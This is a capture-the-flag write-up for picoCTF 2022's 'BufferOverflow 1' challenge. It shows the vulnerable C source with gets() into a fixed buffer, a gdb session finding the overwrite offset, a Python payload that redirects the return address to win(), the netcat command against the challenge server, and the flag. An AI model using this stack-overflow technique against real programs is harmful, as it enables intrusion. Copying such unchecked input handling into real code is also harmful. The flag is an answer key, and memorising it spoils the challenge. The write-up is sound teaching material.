# picoCTF 2022

> Arvind Shima | March 24,2022

## Overview

| Tables | Description |
| ------ | ----------- |
| Category | Binary Exploitation |
| Challenge Name | BufferOverflow 1 |
| Points | 200 |

## Description

Control the return address

#### Hints

- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

## Approach

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

After looked up the source code. The function `win()` never been called. So, It should be the return address. Let's execute the binary in gdb and disassemble main.

### GDB (debugger)

```bash
(gdb) disassemble main 
Dump of assembler code for function main:
   0x080492c4 <+0>:	endbr32 
   0x080492c8 <+4>:	lea    ecx,[esp+0x4]
   0x080492cc <+8>:	and    esp,0xfffffff0
   0x080492cf <+11>:	push   DWORD PTR [ecx-0x4]
   0x080492d2 <+14>:	push   ebp
   0x080492d3 <+15>:	mov    ebp,esp
   0x080492d5 <+17>:	push   ebx
   0x080492d6 <+18>:	push   ecx
   0x080492d7 <+19>:	sub    esp,0x10
   0x080492da <+22>:	call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492df <+27>:	add    ebx,0x2d21
   0x080492e5 <+33>:	mov    eax,DWORD PTR [ebx-0x4]
   0x080492eb <+39>:	mov    eax,DWORD PTR [eax]
   0x080492ed <+41>:	push   0x0
   0x080492ef <+43>:	push   0x2
   0x080492f1 <+45>:	push   0x0
   0x080492f3 <+47>:	push   eax
   0x080492f4 <+48>:	call   0x80490b0 <setvbuf@plt>
   0x080492f9 <+53>:	add    esp,0x10
   0x080492fc <+56>:	call   0x8049070 <getegid@plt>
   0x08049301 <+61>:	mov    DWORD PTR [ebp-0xc],eax
   0x08049304 <+64>:	sub    esp,0x4
   0x08049307 <+67>:	push   DWORD PTR [ebp-0xc]
   0x0804930a <+70>:	push   DWORD PTR [ebp-0xc]
   0x0804930d <+73>:	push   DWORD PTR [ebp-0xc]
   0x08049310 <+76>:	call   0x80490d0 <setresgid@plt>
   0x08049315 <+81>:	add    esp,0x10
   0x08049318 <+84>:	sub    esp,0xc
   0x0804931b <+87>:	lea    eax,[ebx-0x1f60]
   0x08049321 <+93>:	push   eax
   0x08049322 <+94>:	call   0x8049080 <puts@plt>
   0x08049327 <+99>:	add    esp,0x10
   0x0804932a <+102>:	call   0x8049281 <vuln>
   0x0804932f <+107>:	mov    eax,0x0
   0x08049334 <+112>:	lea    esp,[ebp-0x8]
   0x08049337 <+115>:	pop    ecx
   0x08049338 <+116>:	pop    ebx
   0x08049339 <+117>:	pop    ebp
   0x0804933a <+118>:	lea    esp,[ecx-0x4]
   0x0804933d <+121>:	ret    
End of assembler dump.

```

The function `vuln()` get user's inputs. So, Prepare the payload to smash the binary and then analyse the code.

```python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
print padding
```

Execute the python script and piping to file called exploit.

```bash
python2 stack.py > exploit
```

#### GDB (debugger)

Set the breakpoint to vuln() address and run the payload.

```bash
(gdb) break *0x0804932a
Breakpoint 1 at 0x804932a
(gdb) r < exploit 
Starting program: /home/whoami/Workspace/picoctf/picoctf2022/binary_exp/bufferoverflow1/vuln < exploit
Please enter your string: 

Breakpoint 1, 0x0804932a in main ()
(gdb) ni
Okay, time to return... Fingers Crossed... Jumping to 0x4c4c4c4c

Program received signal SIGSEGV, Segmentation fault.
0x4c4c4c4c in ?? ()
(gdb) x win 
0x80491f6 <win>:	0xfb1e0ff3

```

See It overflow's EIP with `0x4c4c4c4c` and `0x4c means 'L'`. Let's cut down the string from `'L'` and modify our python code with return address of `win()`.

```python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
padding += "\xf6\x91\x04\x08" # 0x80491f6
print padding
```

Connect to the netcat and pipe the payload. Here, We got redirected to `win()` address.

```bash
nc saturn.picoctf.net 62786 < exploit 

Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
```

## Flag

```
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```
